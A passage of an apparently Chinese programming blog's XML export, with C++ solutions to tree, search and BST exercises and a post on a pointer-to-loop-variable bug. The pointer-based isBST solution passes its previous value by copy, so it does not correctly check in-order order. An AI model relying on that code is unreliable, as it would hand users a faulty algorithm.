	<span class="token keyword">if</span> <span class="token punctuation">(</span>idx <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">>=</span> T<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> T<span class="token punctuation">[</span>idx <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">dfs</span><span class="token punctuation">(</span>T<span class="token punctuation">,</span> idx <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">,</span> lastVal<span class="token punctuation">)</span> <span class="token operator">||</span> T<span class="token punctuation">[</span>idx <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> lastVal<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
	lastVal <span class="token operator">=</span> T<span class="token punctuation">[</span>idx <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token function">dfs</span><span class="token punctuation">(</span>T<span class="token punctuation">,</span> idx <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> lastVal<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">bool</span> <span class="token function">isBST</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> T<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> lastVal <span class="token operator">=</span> INT32_MIN<span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token function">dfs</span><span class="token punctuation">(</span>T<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> lastVal<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="根据层序序列建立二叉树"><a href="#根据层序序列建立二叉树" class="headerlink" title="根据层序序列建立二叉树"></a>根据层序序列建立二叉树</h1><h2 id="题目描述-19"><a href="#题目描述-19" class="headerlink" title="题目描述"></a>题目描述</h2><p>设一棵二叉树层序遍历序列存储于一个一维数组中，空结点用 <code>INT32_MAX</code> 表示，试编写算法建立该二叉树的二叉链表。</p>
<h2 id="解题代码-19"><a href="#解题代码-19" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp">TreeNode<span class="token operator">*</span> <span class="token function">createTreeByOrder</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> order<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>order<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> INT32_MAX<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>
    queue<span class="token operator">&lt;</span>TreeNode<span class="token operator">*</span><span class="token operator">></span> q<span class="token punctuation">;</span>
    <span class="token keyword">int</span> idx <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    TreeNode<span class="token operator">*</span> root <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">TreeNode</span><span class="token punctuation">(</span>order<span class="token punctuation">[</span>idx<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>q<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        TreeNode<span class="token operator">*</span> fNode <span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        q<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>fNode <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>idx <span class="token operator">&lt;</span> order<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            TreeNode<span class="token operator">*</span> lChild <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>order<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">!=</span> INT32_MAX<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                lChild <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">TreeNode</span><span class="token punctuation">(</span>order<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            fNode<span class="token operator">-></span>left <span class="token operator">=</span> lChild<span class="token punctuation">;</span>
            q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>lChild<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token operator">++</span>idx<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>idx <span class="token operator">&lt;</span> order<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            TreeNode<span class="token operator">*</span> rChild <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>order<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">!=</span> INT32_MAX<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                rChild <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">TreeNode</span><span class="token punctuation">(</span>order<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            fNode<span class="token operator">-></span>right <span class="token operator">=</span> rChild<span class="token punctuation">;</span>
            q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>rChild<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token operator">++</span>idx<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> root<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>算法</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>循环语句中指针赋值出错</title>
    <url>/2022/03/30/%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5%E4%B8%AD%E6%8C%87%E9%92%88%E8%B5%8B%E5%80%BC%E5%87%BA%E9%94%99/</url>
    <content><![CDATA[<p>最近在写人工智能作业的时候遇到了一点问题，就是在循环语句中对指针类型赋值出现错误，导致所有的结点的前驱指针最终指向自身。</p>
<span id="more"></span>

<h1 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h1><p>以下使用一个简单的示例来模拟当时出现的问题。</p>
<p>MyStruct 为一个自定义结构体类型，包含数据成员 val 和前驱结点 pre。首先将初始结点<code>(0，nullptr)</code>加入队列 Q，随后在每次循环中，用变量 fs 接收队列 Q 的队首元素并将其出队，并根据该结点生成一个新结点，该新结点 <code>val = fs.val + 1</code>，且将其前驱结点设为 fs 并加入到队列 Q 中。直到 <code>fs.val &gt;= 5</code> 时退出循环。</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">MyStruct</span>
<span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> val<span class="token punctuation">;</span>
	MyStruct<span class="token operator">*</span> pre<span class="token punctuation">;</span>
	<span class="token function">MyStruct</span><span class="token punctuation">(</span><span class="token keyword">int</span> v <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> MyStruct<span class="token operator">*</span> p <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">val</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">pre</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	std<span class="token double-colon punctuation">::</span>queue<span class="token operator">&lt;</span>MyStruct<span class="token operator">></span> Q<span class="token punctuation">;</span>
	Q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	MyStruct target<span class="token punctuation">;</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>Q<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		MyStruct fs <span class="token operator">=</span> Q<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		Q<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>fs<span class="token punctuation">.</span>val <span class="token operator">>=</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			target <span class="token operator">=</span> fs<span class="token punctuation">;</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		Q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>fs<span class="token punctuation">.</span>val <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fs<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	std<span class="token double-colon punctuation">::</span>cin<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>如果代码运行如我们预期，最终将会得到一个 val 为 5 的结点，并且其前驱为一个 val 为 4 的结点，以此类推，形成一个 val 从 5 到 0 的链表。但事实上，最终结点之间并没有彼此相连，结点 target 的 pre 为自身。</p>
<p><img src="/2022/03/30/%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5%E4%B8%AD%E6%8C%87%E9%92%88%E8%B5%8B%E5%80%BC%E5%87%BA%E9%94%99/wrong.png"></p>
<h1 id="问题原因"><a href="#问题原因" class="headerlink" title="问题原因"></a>问题原因</h1><p>如果仔细观察，变量 fs 在整个循环过程中都占用同一片内存空间，而子节点的前驱结点 pre 直接指定为了 fs 的地址，那么如果 fs 的值遭到改变，即该地址的数据被改变，那么结点的前驱结点 pre 也会被改变。即下次循环执行 <code>MyStruct fs = Q.front();</code> 后结点的前驱结点就遭到了改变，且指向了自身。</p>
<h1 id="解放方法"><a href="#解放方法" class="headerlink" title="解放方法"></a>解放方法</h1><p>由于 fs 的始终占用一片内存空间，为了防止因 fs 的数据被改变而使得结点前驱结点数据遭到改变，可以为结点的前驱结点重新开辟一片内存空间并赋予当前 fs 的数据。</p>
<p><img src="/2022/03/30/%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5%E4%B8%AD%E6%8C%87%E9%92%88%E8%B5%8B%E5%80%BC%E5%87%BA%E9%94%99/right.png"></p>
]]></content>
      <categories>
        <category>经验</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>经验</tag>
        <tag>数据结构与算法</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构编程题 查找</title>
    <url>/2023/08/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BC%96%E7%A8%8B%E9%A2%98%20%E6%9F%A5%E6%89%BE/</url>
    <content><![CDATA[<h1 id="二叉树定义"><a href="#二叉树定义" class="headerlink" title="二叉树定义"></a>二叉树定义</h1><p>以下为本文解题代码的二叉树定义。</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">TreeNode</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> val<span class="token punctuation">;</span>
	TreeNode<span class="token operator">*</span> left<span class="token punctuation">,</span> <span class="token operator">*</span>right<span class="token punctuation">;</span>
	<span class="token function">TreeNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> val <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> TreeNode<span class="token operator">*</span> left <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">,</span> TreeNode<span class="token operator">*</span> right <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span>
		<span class="token operator">:</span> <span class="token function">val</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">left</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">right</span><span class="token punctuation">(</span>right<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>

<h1 id="递归二分查找"><a href="#递归二分查找" class="headerlink" title="递归二分查找"></a>递归二分查找</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>写出二分查找的递归算法。初始调用时，left 为1，right 为 n.</p>
<h2 id="解题代码"><a href="#解题代码" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">bool</span> <span class="token function">recurBS</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> target<span class="token punctuation">,</span> <span class="token keyword">int</span> left<span class="token punctuation">,</span> <span class="token keyword">int</span> right<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>left <span class="token operator">></span> right<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token punctuation">(</span>left <span class="token operator">+</span> right<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">==</span> target<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
	<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">></span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">return</span> <span class="token function">recurBS</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> target<span class="token punctuation">,</span> left<span class="token punctuation">,</span> mid <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">return</span> <span class="token function">recurBS</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> target<span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> right<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="优化顺序查找"><a href="#优化顺序查找" class="headerlink" title="优化顺序查找"></a>优化顺序查找</h1><h2 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h2><p>线性表中各结点的检索概率不等时，可用如下策略提高顺序检索的效率：若找到指定的结点，则将该结点和其前驱节点（若存在）交换，使得经常被检索的结点尽量位于表的前端。试设计在顺序结构和链式结构的线性表上实现上述策略的顺序检索算法。</p>
<h2 id="解题代码-1"><a href="#解题代码-1" class="headerlink" title="解题代码"></a>解题代码</h2><h3 id="顺序表"><a href="#顺序表" class="headerlink" title="顺序表"></a>顺序表</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">bool</span> <span class="token function">optimisedSS</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h3 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">bool</span> <span class="token function">optimisedSS</span><span class="token punctuation">(</span>ListNode<span class="token operator">*</span> head<span class="token punctuation">,</span> <span class="token keyword">int</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
	ListNode<span class="token operator">*</span> dummy <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">ListNode</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> head<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 哨兵结点</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>dummy<span class="token operator">-></span>next<span class="token operator">-></span>val <span class="token operator">==</span> target<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span>dummy<span class="token operator">-></span>next<span class="token operator">-></span>next <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>dummy<span class="token operator">-></span>next<span class="token operator">-></span>next<span class="token operator">-></span>val <span class="token operator">==</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			ListNode<span class="token operator">*</span> pre <span class="token operator">=</span> dummy<span class="token punctuation">;</span>
			ListNode<span class="token operator">*</span> node1 <span class="token operator">=</span> dummy<span class="token operator">-></span>next<span class="token punctuation">;</span>
			ListNode<span class="token operator">*</span> node2 <span class="token operator">=</span> dummy<span class="token operator">-></span>next<span class="token operator">-></span>next<span class="token punctuation">;</span>
			pre<span class="token operator">-></span>next <span class="token operator">=</span> node2<span class="token punctuation">;</span>
			node1<span class="token operator">-></span>next <span class="token operator">=</span> node2<span class="token operator">-></span>next<span class="token punctuation">;</span>
			node2<span class="token operator">-></span>next <span class="token operator">=</span> node1<span class="token punctuation">;</span>
			<span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		dummy <span class="token operator">=</span> dummy<span class="token operator">-></span>next<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="判定二叉搜索树"><a href="#判定二叉搜索树" class="headerlink" title="判定二叉搜索树"></a>判定二叉搜索树</h1><h2 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h2><p>试编写一个算法，判断给定的二叉树是否是二叉搜索树。</p>
<h2 id="解题代码-2"><a href="#解题代码-2" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">bool</span> <span class="token function">dfs</span><span class="token punctuation">(</span>TreeNode<span class="token operator">*</span> root<span class="token punctuation">,</span> <span class="token keyword">int</span> preVal<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">dfs</span><span class="token punctuation">(</span>root<span class="token operator">-></span>left<span class="token punctuation">,</span> preVal<span class="token punctuation">)</span> <span class="token operator">||</span> root<span class="token operator">-></span>val <span class="token operator">&lt;=</span> preVal<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	preVal <span class="token operator">=</span> root<span class="token operator">-></span>val<span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token function">dfs</span><span class="token punctuation">(</span>root<span class="token operator">-></span>right<span class="token punctuation">,</span> preVal<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">bool</span> <span class="token function">isBST</span><span class="token punctuation">(</span>TreeNode<span class="token operator">*</span> root<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> lastVal <span class="token operator">=</span> INT32_MIN<span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token function">dfs</span><span class="token punctuation">(</span>root<span class="token punctuation">,</span> lastVal<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="计算某结点层次"><a href="#计算某结点层次" class="headerlink" title="计算某结点层次"></a>计算某结点层次</h1><h2 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h2><p>设计一个算法，求出指定结点在给定二叉排序树中的层次。</p>
<h2 id="解题代码-3"><a href="#解题代码-3" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">dfs</span><span class="token punctuation">(</span>TreeNode<span class="token operator">*</span> root<span class="token punctuation">,</span> TreeNode<span class="token operator">*</span> node<span class="token punctuation">,</span> <span class="token keyword">int</span> depth<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>root<span class="token operator">-></span>val <span class="token operator">==</span> node<span class="token operator">-></span>val<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">return</span> depth<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>root<span class="token operator">-></span>val <span class="token operator">&lt;</span> node<span class="token operator">-></span>val<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">return</span> <span class="token function">dfs</span><span class="token punctuation">(</span>root<span class="token operator">-></span>right<span class="token punctuation">,</span> node<span class="token punctuation">,</span> depth <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">return</span> <span class="token function">dfs</span><span class="token punctuation">(</span>root<span class="token operator">-></span>left<span class="token punctuation">,</span> node<span class="token punctuation">,</span> depth <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">calNodeDepth</span><span class="token punctuation">(</span>TreeNode<span class="token operator">*</span> root<span class="token punctuation">,</span> TreeNode<span class="token operator">*</span> node<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">return</span> <span class="token function">dfs</span><span class="token punctuation">(</span>root<span class="token punctuation">,</span> node<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>


<h1 id="判定平衡二叉树"><a href="#判定平衡二叉树" class="headerlink" title="判定平衡二叉树"></a>判定平衡二叉树</h1><h2 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h2><p>利用二叉树遍历的遍历的思想，编写一个判断二叉树是否是平衡二叉树的算法。</p>
<h2 id="解题代码-4"><a href="#解题代码-4" class="headerlink" title="解题代码"></a>解题代码</h2><h3 id="O-n-2"><a href="#O-n-2" class="headerlink" title="O(n^2)"></a>O(n^2)</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">calDepth</span><span class="token punctuation">(</span>TreeNode<span class="token operator">*</span> root<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">1</span> <span class="token operator">+</span> <span class="token function">max</span><span class="token punctuation">(</span><span class="token function">calDepth</span><span class="token punctuation">(</span>root<span class="token operator">-></span>left<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">calDepth</span><span class="token punctuation">(</span>root<span class="token operator">-></span>right<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">bool</span> <span class="token function">isBalanced</span><span class="token punctuation">(</span>TreeNode<span class="token operator">*</span> root<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> lDepth <span class="token operator">=</span> <span class="token function">calDepth</span><span class="token punctuation">(</span>root<span class="token operator">-></span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> rDepth <span class="token operator">=</span> <span class="token function">calDepth</span><span class="token punctuation">(</span>root<span class="token operator">-></span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token function">abs</span><span class="token punctuation">(</span>lDepth <span class="token operator">-</span> rDepth<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isBalanced</span><span class="token punctuation">(</span>root<span class="token operator">-></span>left<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isBalanced</span><span class="token punctuation">(</span>root<span class="token operator">-></span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

